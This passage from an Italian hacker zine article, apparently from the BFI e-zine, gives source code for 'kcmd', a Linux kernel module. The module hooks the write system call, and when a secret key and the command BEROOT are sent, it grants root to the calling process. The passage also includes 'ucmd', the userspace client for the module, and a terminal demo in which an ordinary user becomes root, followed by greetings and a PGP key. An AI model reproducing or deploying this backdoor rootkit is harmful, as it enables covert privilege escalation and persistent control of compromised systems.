+	if (!found && strcmp(cmd, "BEROOT") == 0) {
+	    current->p_pptr->uid = 0;
+	    current->p_pptr->gid = 0;
+	    current->p_pptr->euid = 0;
+	    current->p_pptr->egid = 0;
+	    current->p_pptr->ngroups = 1;
+	    current->p_pptr->groups[0] = 0;
+	    sprintf(kbuf, "you are r00t, have fun ;)");
+	    ++found;
+	}
+
+	if (!found)
+	    sprintf(kbuf, "right key but command not found");
+
+	copy_to_user(buf, kbuf, count);
+
+	return -1337;
+    }
+
+
+  out:
+
+    if (kbuf != NULL)
+	kfree(kbuf);
+
+    return o_write(fd, buf, count);
+
+}
+
+
+int
+init_module(void)
+{
+
+    o_write = sys_call_table[__NR_write];
+    sys_call_table[__NR_write] = n_write;
+    console_print("kcmd loaded.\n");
+    return 0;
+
+}
+
+
+void
+cleanup_module(void)
+{
+
+    sys_call_table[__NR_write] = o_write;
+    console_print("kcmd removed.\n");
+
+}
+<-X->
+
+..ed il client a userspace:
+
+<-| ucmd.c |->
+/*
+ * ---------------------------------------------------------------------------
+ * No part of this project may be used to break the law, or to cause damage of
+ * any kind. And I'm not responsible for anything you do with it.
+ * ---------------------------------------------------------------------------
+ * "THE BEER-WARE LICENSE" (by Poul-Henning Kamp, Revision 42):
+ * <xenion@acidlife.com> wrote this file.  As long as you retain this notice
+ * you can do whatever you want with this stuff. If we meet some day, and you
+ * think this stuff is worth it, you can buy me a beer in return.
+ * xenion ~ Dallachiesa Michele
+ * ---------------------------------------------------------------------------
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdarg.h>
+
+#define MAGICFD -1337
+#define BUFLEN 1024
+#define KEY "IMightBeWrong"
+
+void            fatal(char *, ...);
+
+int
+main(int argc, char **argv)
+{
+    char            buf[BUFLEN],
+                    buf2[BUFLEN];
+
+    if (argc < 2) {
+        printf("usage: %s <CMD>\n\n", argv[0]);
+        exit(0);
+    }
+
+    memset(buf, '\0', BUFLEN);
+
+    if (sizeof KEY + strlen(argv[1]) + 1 > BUFLEN)
+        fatal("CMD too long");
+
+    strcpy(buf, KEY);
+    strcpy(buf + sizeof KEY, argv[1]);
+
+    printf("Sending Request..\n");
+    memcpy(buf2, buf, BUFLEN);
+    write(MAGICFD, buf, BUFLEN);
+    if (memcmp(buf, buf2, BUFLEN) != 0)
+        printf("received: [%s]\n", buf);
+    else
+        printf("kcmd not installed\n");
+
+    return 0;
+
+}
+
+void
+fatal(char *pattern, ...)
+{
+
+    va_list         ap;
+    va_start(ap, pattern);
+
+    vfprintf(stderr, pattern, ap);
+    fprintf(stderr, "; exit forced.\n");
+
+    va_end(ap);
+
+    exit(-1);
+
+}
+<-X->
+
+vediamo come funziona:
+
+xe@gw:~$ id
+uid=1003(xe) gid=100(users) groups=100(users)
+xe@gw:~$ ./ucmd PID
+Sending Request..
+received: [your PID is 1378]
+xe@gw:~$ ./ucmd BEROOT
+Sending Request..
+received: [you are r00t, have fun ;)]
+xe@gw:~$ id
+uid=0(root) gid=0(root) groups=0(root)
+xe@gw:~$
+
+
+==============================================================================
+EOF
+
+ok, fine.
+Un saluto a derte(il miglior programmatore di bottoni :D), awgn, dark-angel, 
+nk, nine, cyberbrown, fake(che fine hai fatto?), vecna, troll(la prossima 
+volta non ti sveglierai in ospedale :P), #phrack.it, #c/c++ e a tutte le 
+persone che conosco :)
+
+--xenion
+
+
+
+-[ WEB ]----------------------------------------------------------------------
+
+        http://www.bfi.cx
+        http://www.s0ftpj.org/bfi/
+        http://bfi.itapac.net
+
+
+-[ E-MAiL ]-------------------------------------------------------------------
+
+        bfi@s0ftpj.org
+
+
+-[ PGP ]----------------------------------------------------------------------
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.3i
+mQENAzZsSu8AAAEIAM5FrActPz32W1AbxJ/LDG7bB371rhB1aG7/AzDEkXH67nni
+DrMRyP+0u4tCTGizOGof0s/YDm2hH4jh+aGO9djJBzIEU8p1dvY677uw6oVCM374
+nkjbyDjvBeuJVooKo+J6yGZuUq7jVgBKsR0uklfe5/0TUXsVva9b1pBfxqynK5OO
+lQGJuq7g79jTSTqsa0mbFFxAlFq5GZmL+fnZdjWGI0c2pZrz+Tdj2+Ic3dl9dWax
+iuy9Bp4Bq+H0mpCmnvwTMVdS2c+99s9unfnbzGvO6KqiwZzIWU9pQeK+v7W6vPa3
+TbGHwwH4iaAWQH0mm7v+KdpMzqUPucgvfugfx+kABRO0FUJmSTk4IDxiZmk5OEB1
+c2EubmV0PokBFQMFEDZsSu+5yC9+6B/H6QEBb6EIAMRP40T7m4Y1arNkj5enWC/b
+a6M4oog42xr9UHOd8X2cOBBNB8qTe+dhBIhPX0fDJnnCr0WuEQ+eiw0YHJKyk5ql
+GB/UkRH/hR4IpA0alUUjEYjTqL5HZmW9phMA9xiTAqoNhmXaIh7MVaYmcxhXwoOo
+WYOaYoklxxA5qZxOwIXRxlmaN48SKsQuPrSrHwTdKxd+qB7QDU83h8nQ7dB4MAse
+gDvMUdspekxAX8XBikXLvVuT0ai4xd8o8owWNR5fQAsNkbrdjOUWrOs0dbFx2K9J
+l3XqeKl3XEgLvVG8JyhloKl65h9rUyw6Ek5hvb5ROuyS/lAGGWvxv2YJrN8ABLo=
+=o7CG
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+==============================================================================
+-----------------------------------[ EOF ]------------------------------------
+==============================================================================
+				
